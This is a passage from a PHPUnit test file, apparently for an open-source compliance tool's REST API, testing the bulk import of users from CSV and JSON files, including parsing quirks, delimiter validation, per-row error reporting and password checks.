    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);
    $request->shouldReceive('getHeaderLine')->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getParsedBody')->andReturn(['delimiter' => ['a', 'b']]);

    $controller = $this->newControllerWithMockedCreateUser();
    $controller->shouldReceive('createUserFromImportRow')->once()->andReturn([true, 'ok']);

    $response = $controller->handleImportUsers($request, new ResponseHelper(), []);
    $this->assertEquals(200, $response->getStatusCode());
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() with a JSON file using the
   *    {"users": [...]} wrapper and a nested agents object
   * -# Check that the row is translated into the createUserFromImportRow()
   *    DTO shape correctly
   */
  public function testHandleImportUsersJsonWrappedHappyPath()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $json = json_encode([
      'users' => [
        [
          'name' => 'carol',
          'email' => 'carol@example.com',
          'accessLevel' => 'read_only',
          'agents' => ['mime' => true, 'nomos' => true],
        ],
      ],
    ]);
    $path = $this->writeTempFile($json, '.json');
    $this->setUploadedFile($path, 'users.json');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);

    $controller = $this->newControllerWithMockedCreateUser();
    $controller->shouldReceive('createUserFromImportRow')->once()->andReturnUsing(
      function ($userDetails) {
        $this->assertEquals('carol', $userDetails['name']);
        $this->assertTrue($userDetails['agents']['mime']);
        $this->assertTrue($userDetails['agents']['nomos']);
        $this->assertFalse($userDetails['agents']['ecc']);
        return [true, "User 'carol' created successfully."];
      }
    );

    $response = $controller->handleImportUsers($request, new ResponseHelper(), []);
    $this->assertEquals(200, $response->getStatusCode());
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() where every row fails
   * -# Check if HttpBadRequestException is thrown
   */
  public function testHandleImportUsersAllRowsFail()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $csv = "name,email\nalice,alice@example.com\n";
    $path = $this->writeTempFile($csv, '.csv');
    $this->setUploadedFile($path, 'users.csv');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);
    $request->shouldReceive('getHeaderLine')->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getParsedBody')->andReturn([]);

    $controller = $this->newControllerWithMockedCreateUser();
    $controller->shouldReceive('createUserFromImportRow')->andReturn([false, 'User already exists.']);

    $this->expectException(HttpBadRequestException::class);

    $controller->handleImportUsers($request, new ResponseHelper(), []);
  }

  /**
   * @test
   * -# Test UserController::createUserFromImportRow() with no "userPass"
   * -# Check that it returns a clear failure instead of creating the user
   *    with an empty/unusable password
   */
  public function testCreateUserFromImportRowRequiresPassword()
  {
    $result = $this->invokePrivate($this->userController, 'createUserFromImportRow',
      [['name' => 'alice']]);

    $this->assertFalse($result[0]);
    $this->assertStringContainsString('Password', $result[1]);
  }

  /**
   * @test
   * -# Test UserController::createUserFromImportRow() with a non-string
   *    "userPass" (e.g. a malformed JSON value)
   * -# Check that it is rejected the same way a missing password is,
   *    rather than being passed through to password_hash() downstream
   */
  public function testCreateUserFromImportRowRejectsNonStringPassword()
  {
    $result = $this->invokePrivate($this->userController, 'createUserFromImportRow',
      [['name' => 'alice', 'userPass' => ['not', 'a', 'string']]]);

    $this->assertFalse($result[0]);
    $this->assertStringContainsString('Password', $result[1]);
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() with a CSV row missing
   *    "userPass" (real, unmocked createUserFromImportRow())
   * -# Check that the row fails with a clear message instead of silently
   *    creating a user with an empty password
   */
  public function testHandleImportUsersMissingPasswordFailsRow()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $csv = "name,email\nalice,alice@example.com\n";
    $path = $this->writeTempFile($csv, '.csv');
    $this->setUploadedFile($path, 'users.csv');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);
    $request->shouldReceive('getHeaderLine')->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getParsedBody')->andReturn([]);

    $this->expectException(HttpBadRequestException::class);
    $this->expectExceptionMessage('Password must be specified');

    $this->userController->handleImportUsers($request, new ResponseHelper(), []);
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() with a blank line between
   *    a successful row and a row with a missing name
   * -# Check that the reported row number is the physical file line (4),
   *    not the post-filtering array position (2)
   */
  public function testHandleImportUsersCsvRowNumberAccountsForBlankLines()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $csv = "name,email\n" .
      "alice,alice@example.com\n" .
      "\n" .
      ",noname@example.com\n";
    $path = $this->writeTempFile($csv, '.csv');
    $this->setUploadedFile($path, 'users.csv');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);
    $request->shouldReceive('getHeaderLine')->withArgs(['Content-Type'])->andReturn('');
    $request->shouldReceive('getParsedBody')->andReturn([]);

    $controller = $this->newControllerWithMockedCreateUser();
    $controller->shouldReceive('createUserFromImportRow')->once()->andReturn([true, 'ok']);

    $response = $controller->handleImportUsers($request, new ResponseHelper(), []);
    $body = json_decode((string) $response->getBody(), true);
    $this->assertStringContainsString('Row 4: Username must be specified.', $body['message']);
  }

  /**
   * @runInSeparateProcess
   * @preserveGlobalState disabled
   * @test
   * -# Test UserController::handleImportUsers() with a single JSON object
   *    missing "name"
   * -# Check that it fails with the normal per-row "Username must be
   *    specified" error instead of the generic "No users found"
   */
  public function testHandleImportUsersJsonSingleObjectWithoutNameGivesRowError()
  {
    $_SESSION[Auth::USER_LEVEL] = Auth::PERM_ADMIN;
    $json = json_encode(['email' => 'x@example.com']);
    $path = $this->writeTempFile($json, '.json');
    $this->setUploadedFile($path, 'users.json');

    $request = M::mock(Request::class);
    $request->shouldReceive('getAttribute')->andReturn(ApiVersion::V2);

    $this->expectException(HttpBadRequestException::class);
    $this->expectExceptionMessage('Username must be specified');

    $this->userController->handleImportUsers($request, new ResponseHelper(), []);
  }

  /**
   * @test
   * -# Test UserController::resolveCsvOption() with a missing, empty, and
   *    non-string value
   * -# Check that all three fall back to the given default
   */
  public function testResolveCsvOptionDefaults()
  {
    $this->assertEquals(',',
      $this->invokePrivate($this->userController, 'resolveCsvOption',
        [null, UserController::CSV_DELIMITERS, ',', 'delimiter']));
    $this->assertEquals(',',
      $this->invokePrivate($this->userController, 'resolveCsvOption',
        ['', UserController::CSV_DELIMITERS, ',', 'delimiter']));
    $this->assertEquals(',',
      $this->invokePrivate($this->userController, 'resolveCsvOption',
        [['a'], UserController::CSV_DELIMITERS, ',', 'delimiter']));
  }

  /**
   * @test
   * -# Test UserController::resolveCsvOption() with each allowed value
   * -# Check that every one of CSV_DELIMITERS/CSV_ENCLOSURES is accepted
   *    as-is, including the tab byte
   */
  public function testResolveCsvOptionAcceptsAllowedValues()
  {
    foreach (UserController::CSV_DELIMITERS as $delimiter) {
      $this->assertEquals($delimiter,
        $this->invokePrivate($this->userController, 'resolveCsvOption',
          [$delimiter, UserController::CSV_DELIMITERS, ',', 'delimiter']));
    }
    foreach (UserController::CSV_ENCLOSURES as $enclosure) {
      $this->assertEquals($enclosure,
        $this->invokePrivate($this->userController, 'resolveCsvOption',
          [$enclosure, UserController::CSV_ENCLOSURES, '"', 'enclosure']));
    }
  }

  /**
   * @test
   * -# Test UserController::resolveCsvOption() with a value outside the
   *    allowed set
   * -# Check if HttpBadRequestException is thrown
   */
  public function testResolveCsvOptionRejectsDisallowedValue()
  {
    $this->expectException(HttpBadRequestException::class);
    $this->invokePrivate($this->userController, 'resolveCsvOption',
      ['|', UserController::CSV_DELIMITERS, ',', 'delimiter']);
  }

  /**
   * @test
   * -# Test UserController::buildImportAgentCheckboxes() for the V2-shaped
   *    agents DTO produced by importRowToUserDetails()
   * -# Check that every AGENT_KEYS entry is read correctly for the import
   *    path, and that pkgagent/softwareHeritage/ipra (deliberately excluded
   *    from AGENT_KEYS) have no effect even if present in the DTO
   */
  public function testBuildImportAgentCheckboxes()
  {
    $agentsDto = [
      'bucket' => true, 'copyrightEmailAuthor' => true, 'ecc' => false,
      'keyword' => false, 'mime' => true, 'monk' => false,
      'nomos' => false, 'ojo' => false, 'reso' => false,
      'pkgagent' => true, 'softwareHeritage' => true, 'ipra' => true,
    ];
    $result = $this->invokePrivate($this->userController, 'buildImportAgentCheckboxes',
      [$agentsDto]);

    $this->assertEquals(1, $result['Check_agent_bucket']);
    $this->assertEquals(1, $result['Check_agent_copyright']);
    $this->assertEquals(0, $result['Check_agent_ecc']);
    $this->assertEquals(1, $result['Check_agent_mimetype']);
    $this->assertArrayNotHasKey('Check_agent_pkgagent', $result);
    $this->assertArrayNotHasKey('Check_agent_shagent', $result);
    $this->assertArrayNotHasKey('Check_agent_ipra', $result);
  }

  /**
   * @test
   * -# Test UserController::buildImportAgentCheckboxes() with no agents given
   * -# Check that an empty map is returned instead of erroring
   */
  public function testBuildImportAgentCheckboxesEmpty()
  {
    $result = $this->invokePrivate($this->userController, 'buildImportAgentCheckboxes',
      [null]);
    $this->assertEquals([], $result);
  }

  /**
   * @test
   * -# Test UserController::parseUsersCsv() with a blank line and a ragged
   *    (too many columns) row
   * -# Check that both are handled without error, columns map correctly,
   *    and each row's _csvLineNumber matches its physical file line
   *    (accounting for the blank line in between)
   */
  public function testParseUsersCsv()
  {
    $csv = "name,email,agent_mime,agent_monk\n" .
      "alice,alice@example.com,1,0\n" .
      "\n" .
      "bob,bob@example.com,0,1,extra,columns\n";
    $path = $this->writeTempFile($csv, '.csv');

    $rows = $this->invokePrivate($this->userController, 'parseUsersCsv', [$path, ',', '"']);

    $this->assertCount(2, $rows);
    $this->assertEquals('alice', $rows[0]['name']);
    $this->assertTrue($rows[0]['agents']['mime']);
    $this->assertFalse($rows[0]['agents']['monk']);
    $this->assertEquals(2, $rows[0]['_csvLineNumber']);
    $this->assertEquals('bob', $rows[1]['name']);
    $this->assertFalse($rows[1]['agents']['mime']);
    $this->assertTrue($rows[1]['agents']['monk']);
    $this->assertEquals(4, $rows[1]['_csvLineNumber']);
  }

  /**
   * @test
   * -# Test UserController::parseUsersCsv() with a leading UTF-8 BOM (as
   *    produced by Excel's "CSV UTF-8" export)
   * -# Check that the BOM is stripped from the header so "name" is still
   *    recognized instead of every row silently losing its username
   */
  public function testParseUsersCsvStripsUtf8Bom()
  {
    $csv = "\xEF\xBB\xBFname,email\nalice,alice@example.com\n";
    $path = $this->writeTempFile($csv, '.csv');

    $rows = $this->invokePrivate($this->userController, 'parseUsersCsv', [$path, ',', '"']);

    $this->assertCount(1, $rows);
    $this->assertEquals('alice', $rows[0]['name']);
  }

  /**
   * @test
   * -# Test UserController::parseUsersCsv() with a quoted field containing
   *    an embedded newline (fgetcsv() consumes 2 physical lines for that
   *    one logical row)
   * -# Check that the next row's _csvLineNumber still matches its true
   *    physical line, not just "previous row's line + 1"
   */
  public function testParseUsersCsvLineNumberAccountsForEmbeddedNewlines()
  {
    $csv = "name,description,email\n" .
      "alice,\"Line1\nLine2\",alice@example.com\n" .
      "bob,short,bob@example.com\n";
    $path = $this->writeTempFile($csv, '.csv');

    $rows = $this->invokePrivate($this->userController, 'parseUsersCsv', [$path, ',', '"']);

    $this->assertCount(2, $rows);
    $this->assertEquals('alice', $rows[0]['name']);
    $this->assertEquals(2, $rows[0]['_csvLineNumber']);
    $this->assertEquals('bob', $rows[1]['name']);
    $this->assertEquals(4, $rows[1]['_csvLineNumber']);
  }

  /**
   * @test
   * -# Test UserController::parseUsersCsv() with a header containing a
   *    duplicate column name (e.g. "name" twice)
   * -# Check that false is returned instead of silently discarding the
   *    first column's values via array_combine()
   */
  public function testParseUsersCsvRejectsDuplicateHeaderColumns()
  {
    $csv = "name,email,name\nalice,alice@example.com,bob\n";
    $path = $this->writeTempFile($csv, '.csv');

    $rows = $this->invokePrivate($this->userController, 'parseUsersCsv', [$path, ',', '"']);

    $this->assertFalse($rows);
  }

  /**
   * @test
   * -# Test UserController::parseUsersCsv() with a "userPass" column
   * -# Check that it is captured into the DTO like any other field
   */
  public function testParseUsersCsvCapturesUserPass()
  {
    $csv = "name,userPass\nalice,Secret123!\n";
    $path = $this->writeTempFile($csv, '.csv');

    $rows = $this->invokePrivate($this->userController, 'parseUsersCsv', [$path, ',', '"']);

    $this->assertEquals('Secret123!', $rows[0]['userPass']);
  }

  /**
   * @test
   * -# Test UserController::parseUsersCsv() with an unreadable file path
   * -# Check that false is returned instead of erroring
   */
  public function testParseUsersCsvUnreadableFile()
  {
    $rows = $this->invokePrivate($this->userController, 'parseUsersCsv',
      ['/nonexistent/path/does-not-exist.csv', ',', '"']);
    $this->assertFalse($rows);
  }

  /**
   * @test
   * -# Test UserController::parseUsersJson() with a plain JSON array of users
   */
  public function testParseUsersJsonList()
  {
    $path = $this->writeTempFile(json_encode([
      ['name' => 'alice', 'agents' => ['mime' => true]],
      ['name' => 'bob'],
    ]), '.json');

    $rows = $this->invokePrivate($this->userController, 'parseUsersJson', [$path]);

    $this->assertCount(2, $rows);
    $this->assertEquals('alice', $rows[0]['name']);
    $this->assertTrue($rows[0]['agents']['mime']);
    $this->assertEquals('bob', $rows[1]['name']);
  }

  /**
   * @test
   * -# Test UserController::parseUsersJson() with a single user object (not
   *    wrapped in an array)
   */
  public function testParseUsersJsonSingleObject()
  {
    $path = $this->writeTempFile(
      json_encode(['name' => 'alice', 'email' => 'alice@example.com']), '.json');

    $rows = $this->invokePrivate($this->userController, 'parseUsersJson', [$path]);

    $this->assertCount(1, $rows);
    $this->assertEquals('alice', $rows[0]['name']);
  }

  /**
   * @test
   * -# Test UserController::parseUsersJson() with a single user object that
   *    is missing "name"
   * -# Check that it is still wrapped as one row (detected by shape, not
   *    by the presence of "name") instead of being misread as a bag of
   *    scalar values and silently producing zero rows
   */
  public function testParseUsersJsonSingleObjectWithoutName()
  {
    $path = $this->writeTempFile(
      json_encode(['email' => 'x@example.com']), '.json');

    $rows = $this->invokePrivate($this->userController, 'parseUsersJson', [$path]);

    $this->assertCount(1, $rows);
    $this->assertEquals('', $rows[0]['name']);
    $this->assertEquals('x@example.com', $rows[0]['email']);
  }

  /**
   * @test
   * -# Test UserController::parseUsersJson() with a "userPass" field
   * -# Check that it is captured into the DTO like any other field
   */
  public function testParseUsersJsonCapturesUserPass()
  {
    $path = $this->writeTempFile(
      json_encode(['name' => 'alice', 'userPass' => 'Secret123!']), '.json');

    $rows = $this->invokePrivate($this->userController, 'parseUsersJson', [$path]);

    $this->assertEquals('Secret123!', $rows[0]['userPass']);
  }

  /**
   * @test
   * -# Test UserController::parseUsersJson() with the {"users": [...]}
   *    wrapper produced by the JSON export
   */
  public function testParseUsersJsonWrapped()
  {
    $path = $this->writeTempFile(
      json_encode(['users' => [['name' => 'alice']]]), '.json');

    $rows = $this->invokePrivate($this->userController, 'parseUsersJson', [$path]);

    $this->assertCount(1, $rows);
    $this->assertEquals('alice', $rows[0]['name']);
  }

  /**
   * @test
   * -# Test UserController::parseUsersJson() with malformed JSON
   * -# Check that false is returned instead of erroring
   */
  public function testParseUsersJsonMalformed()
  {
    $path = $this->writeTempFile('{not valid json', '.json');

    $rows = $this->invokePrivate($this->userController, 'parseUsersJson', [$path]);

    $this->assertFalse($rows);
  }
}
